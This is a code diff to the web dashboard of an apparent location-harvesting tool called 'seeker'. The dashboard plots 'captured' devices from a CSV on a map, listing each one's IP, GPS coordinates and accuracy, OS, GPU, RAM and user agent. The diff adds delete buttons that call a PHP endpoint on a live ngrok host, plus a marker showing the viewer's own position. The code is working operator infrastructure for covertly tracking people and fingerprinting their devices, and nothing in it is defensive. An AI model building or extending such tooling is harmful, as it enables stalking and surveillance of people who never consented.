@@ -91,6 +91,13 @@
       font-size: 10px; padding: 2px 7px; border-radius: 20px; background: rgba(47,129,247,.15);
       color: var(--accent); border: 1px solid rgba(47,129,247,.35); white-space: nowrap;
     }
+    .card .right { display: flex; align-items: center; gap: 6px; }
+    .card-del {
+      background: transparent; border: 1px solid var(--border); color: var(--danger);
+      padding: 3px 7px; border-radius: 6px; font-size: 12px; line-height: 1;
+      cursor: pointer; flex-shrink: 0;
+    }
+    .card-del:hover { background: var(--danger); color: #fff; filter: none; }
     .card .meta { font-size: 12px; color: var(--muted); margin-top: 6px; line-height: 1.55; }
     .card .meta b { color: var(--text); font-weight: 600; }
     .card .ip { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
@@ -181,6 +188,14 @@
     var POLL_MS = 10000;
     var DATA_URL = 'db/results.csv';
 
+    // Server-side delete endpoint (seeker/delete_handler.php). Relative by
+    // default so it works when the dashboard is served from the same PHP host
+    // as the CSV. When the dashboard is on GitHub Pages (static, no PHP), point
+    // this at the PHP host, e.g. 'https://<ngrok-id>.ngrok-free.app/delete_handler.php'.
+    // If the endpoint is unreachable, delete falls back to a CSV download.
+    var DELETE_ENDPOINT = 'https://trapezoid-tributary-deny.ngrok-free.dev/delete_handler.php';
+    var DELETE_TOKEN = '';   // set if delete_handler.php has ADMIN_TOKEN enabled
+
     var map = L.map('map', { zoomControl: true }).setView([29.315, 48.020], 6);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
       maxZoom: 19,
@@ -229,9 +244,13 @@
       return parseFloat(m);
     }
 
-    function parseRow(cols) {
+    function parseRow(cols, idx) {
+      // results.csv has no id column, so a device's id is its 1-based line
+      // position — the same key delete_handler.php uses to locate the row.
       var d = {
-        os: cols[0] || '', platform: cols[1] || '', cores: cols[2] || '',
+        devnum: String((idx || 0) + 1),
+        os: cols[0] || '',
+        platform: cols[1] || '', cores: cols[2] || '',
         ram: cols[3] || '', vendor: cols[4] || '', gpu: cols[5] || '',
         res: cols[6] || '', ua: cols[7] || '', ip: cols[8] || '',
         geo: '', lat: NaN, lon: NaN, acc: '', alt: '', dir: '', spd: ''
@@ -295,7 +314,9 @@
       var badge = d.hasLoc ? accStr(d.acc) + ' acc' : 'no fix';
       return '' +
         '<div class="row1"><span class="name">#' + (idx + 1) + ' · ' + esc(title) + '</span>' +
-        '<span class="badge">' + esc(badge) + '</span></div>' +
+        '<span class="right"><span class="badge">' + esc(badge) + '</span>' +
+        '<button class="card-del" title="Delete this device" data-devnum="' + esc(d.devnum) + '">🗑️</button>' +
+        '</span></div>' +
         '<div class="meta">' +
         '<span class="ip">' + esc(d.ip) + '</span><br>' +
         '<b>' + esc(d.os) + '</b> · ' + esc(d.ua) + '<br>' +
@@ -342,6 +363,13 @@
           el.className = 'card' + (i === activeIdx ? ' active' : '');
           el.innerHTML = cardHtml(d, i);
           el.addEventListener('click', function () { focusDevice(i); });
+          var delBtn = el.querySelector('.card-del');
+          if (delBtn) {
+            delBtn.addEventListener('click', function (ev) {
+              ev.stopPropagation();
+              deleteDevice(d.devnum, i);
+            });
+          }
           list.appendChild(el);
         });
       }
@@ -377,7 +405,7 @@
         })
         .then(function (text) {
           var lines = text.split(/\r?\n/).filter(function (l) { return l.trim().length; });
-          devices = lines.map(function (l) { return parseRow(parseCsvLine(l)); });
+          devices = lines.map(function (l, i) { return parseRow(parseCsvLine(l), i); });
           render();
           setStatus('Updated ' + timeStr() + ' · every ' + (POLL_MS / 1000) + 's', false);
         })
@@ -417,7 +445,11 @@
             var cols = parseCsvLine(line);
             if (cols.length < 9) return;
 
-            var os = cols[0] || 'Unknown';
+            // Device id == 1-based line position in results.csv (the file has
+            // no id column), matching how delete_handler.php locates the row.
+            var devnum = String(idx + 1);
+            var first = cols[0] || '';
+            var os = first || 'Unknown';
             var ip = cols[8] || 'Unknown';
             var lat = '', lon = '';
             for (var i = 9; i < cols.length - 1; i++) {
@@ -430,12 +462,12 @@
             div.className = 'del-device';
             div.innerHTML =
               '<div class="del-device-info">' +
-                '<strong>[' + idx + '] ' + esc(os.substring(0, 50)) + '</strong><br>' +
+                '<strong>#' + esc(devnum) + ' · ' + esc(os.substring(0, 50)) + '</strong><br>' +
                 '<small>IP: ' + esc(ip) + (lat ? ' | ' + esc(lat) + ', ' + esc(lon) : '') + '</small>' +
               '</div>' +
               '<button class="del-btn">Delete</button>';
             div.querySelector('.del-btn').addEventListener('click', function () {
-              deleteDevice(idx, lines);
+              deleteDevice(devnum, -1);
             });
             listEl.appendChild(div);
           });
@@ -445,21 +477,173 @@
         });
     }
 
-    function deleteDevice(index, lines) {
-      if (!confirm('Delete device #' + index + '?')) return;
-      lines.splice(index, 1);
-      var newCsv = lines.join('\n');
-      var blob = new Blob([newCsv], { type: 'text/csv' });
-      var url = URL.createObjectURL(blob);
-      var a = document.createElement('a');
-      a.href = url;
-      a.download = 'results.csv';
-      a.click();
-      alert('Downloaded updated results.csv — replace the file in seeker/db/ and the sync will push it to GitHub.');
-      loadDeleteList();
+    // Unified delete: hit the PHP endpoint (real server-side delete on the CSV),
+    // with optimistic UI removal from the main list. If the endpoint isn't
+    // reachable (e.g. dashboard on static GitHub Pages), fall back to a
+    // CSV-download flow so the operator can still update the file manually.
+    function postDelete(devnum) {
+      var url = DELETE_ENDPOINT + '?device=' + encodeURIComponent(devnum) +
+        (DELETE_TOKEN ? '&token=' + encodeURIComponent(DELETE_TOKEN) : '') +
+        '&_=' + Date.now();
+      return fetch(url, { method: 'DELETE', cache: 'no-store' }).then(function (r) {
+        return r.text().then(function (t) {
+          var j = null;
+          try { j = JSON.parse(t); } catch (e) {}
+          if (!r.ok || !j || !j.ok) {
+            throw new Error(j && j.error ? j.error : ('HTTP ' + r.status));
+          }
+          return j;
+        });
+      });
+    }
+
+    function deleteDevice(devnum, mainIdx) {
+      if (!confirm('Delete device #' + devnum + '?\nThis removes it from results.csv.')) return;
+
+      // Optimistic removal from the main device list.
+      var snapshot = devices.slice();
+      if (typeof mainIdx === 'number' && mainIdx >= 0 && mainIdx < devices.length) {
+        devices.splice(mainIdx, 1);
+        if (activeIdx === mainIdx) activeIdx = -1;
+        render();
+      }
+      setStatus('Deleting device #' + devnum + '…', false);
+
+      postDelete(devnum)
+        .then(function (j) {
+          setStatus('Deleted #' + devnum + ' · ' + j.remaining + ' remaining', false);
+          load(); // authoritative re-sync from server
+          if (document.getElementById('tab-delete').classList.contains('active')) {
+            loadDeleteList();
+          }
+        })
+        .catch(function (e) {
+          // Roll back the optimistic change, then offer the download fallback.
+          devices = snapshot;
+          render();
+          setStatus('Server delete unavailable (' + e.message + ') — download fallback', true);
+          downloadCsvWithout(devnum);
+        });
+    }
+
+    // Fallback for static hosting: build an updated CSV client-side and
+    // download it so the operator can replace seeker/db/results.csv by hand.
+    function downloadCsvWithout(devnum) {
+      fetch(DATA_URL + '?_=' + Date.now(), { cache: 'no-store' })
+        .then(function (r) { return r.text(); })
+        .then(function (text) {
+          var lines = text.split(/\r?\n/).filter(function (l) { return l.trim(); });
+          var kept = lines.filter(function (l) {
+            var m = l.match(/^(\d+)\t/);
+            return !(m && m[1] === String(devnum));
+          });
+          var csv = kept.length ? kept.join('\n') + '\n' : '';
+          var url = URL.createObjectURL(new Blob([csv], { type: 'text/csv' }));
+          var a = document.createElement('a');
+          a.href = url; a.download = 'results.csv'; a.click();
+          URL.revokeObjectURL(url);
+          alert('Server-side delete is not available on this host.\n\n' +
+                'Downloaded an updated results.csv with device #' + devnum + ' removed.\n' +
+                'Replace seeker/db/results.csv with it — the 10s sync will push it to GitHub.');
+          if (document.getElementById('tab-delete').classList.contains('active')) {
+            loadDeleteList();
+          }
+        })
+        .catch(function (e) { alert('Delete failed: ' + e.message); });
     }
 
     document.getElementById('delete-refresh-btn').addEventListener('click', loadDeleteList);
+
+    /* ---- Client-side live location (this browser) ---- */
+    // Shows where the person VIEWING this dashboard is, using the browser's
+    // Geolocation API. This is independent of the captured device list above.
+    var meMarker = null;   // Leaflet marker for our own position
+    var meCircle = null;   // accuracy circle around it
+
+    // Small status control pinned to the map (bottom-left) so it never
+    // interferes with the sidebar's existing device-status line.
+    var geoControl = L.control({ position: 'bottomleft' });
+    geoControl.onAdd = function () {
+      var div = L.DomUtil.create('div', 'me-status');
+      div.style.cssText =
+        'background:#161b22;border:1px solid #2a3441;border-radius:8px;' +
+        'padding:6px 10px;font:12px/1.4 sans-serif;color:#e6edf3;' +
+        'box-shadow:0 1px 4px rgba(0,0,0,.4);max-width:260px;';
+      div.id = 'me-status';
+      div.textContent = 'Locating…';
+      return div;
+    };
+    geoControl.addTo(map);
+
+    function setMeStatus(txt, isErr) {
+      var el = document.getElementById('me-status');
+      if (el) { el.textContent = txt; el.style.color = isErr ? '#f85149' : '#e6edf3'; }
+    }
+
+    // Blue "you are here" dot, visually distinct from the red device pins.
+    var meIcon = L.divIcon({
+      className: 'me-dot',
+      html: '<div style="width:16px;height:16px;border-radius:50%;' +
+            'background:#2f81f7;border:3px solid #fff;' +
+            'box-shadow:0 0 0 2px rgba(47,129,247,.5);"></div>',
+      iconSize: [16, 16],
+      iconAnchor: [8, 8]
+    });
+
+    function onGeoOk(pos) {
+      var lat = pos.coords.latitude;
+      var lon = pos.coords.longitude;
+      var acc = pos.coords.accuracy; // metres
+
+      // Place / move our marker.
+      if (meMarker) {
+        meMarker.setLatLng([lat, lon]);
+      } else {
+        meMarker = L.marker([lat, lon], { icon: meIcon, zIndexOffset: 1000 })
+          .addTo(map).bindPopup('<b>You are here</b>');
+      }
+      // Accuracy circle.
+      if (meCircle) {
+        meCircle.setLatLng([lat, lon]).setRadius(acc);
+      } else {
+        meCircle = L.circle([lat, lon], {
+          radius: acc, color: '#2f81f7', weight: 1,
+          fillColor: '#2f81f7', fillOpacity: 0.12
+        }).addTo(map);
+      }
+
+      setMeStatus('Your location: ' + lat.toFixed(3) + ', ' + lon.toFixed(3) +
+                  ' (accuracy: ' + Math.round(acc) + 'm)', false);
+
+      // Center on us the first time only (don't fight the user's panning).
+      if (!onGeoOk._centered) {
+        map.setView([lat, lon], Math.max(map.getZoom(), 14));
+        onGeoOk._centered = true;
+      }
+    }
+
+    function onGeoErr(err) {
+      var msg;
+      switch (err.code) {
+        case err.PERMISSION_DENIED:    msg = 'Location permission denied.'; break;
+        case err.POSITION_UNAVAILABLE: msg = 'Location unavailable.'; break;
+        case err.TIMEOUT:              msg = 'Location request timed out.'; break;
+        default:                       msg = 'Location error: ' + (err.message || 'unknown');
+      }
+      setMeStatus(msg, true);
+    }
+
+    // Kick off automatically on load. watchPosition keeps the dot live as
+    // the viewer moves; getCurrentPosition would be a one-shot alternative.
+    if ('geolocation' in navigator) {
+      navigator.geolocation.watchPosition(onGeoOk, onGeoErr, {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 5000
+      });
+    } else {
+      setMeStatus('Geolocation not supported by this browser.', true);
+    }
 
   })();
   </script>
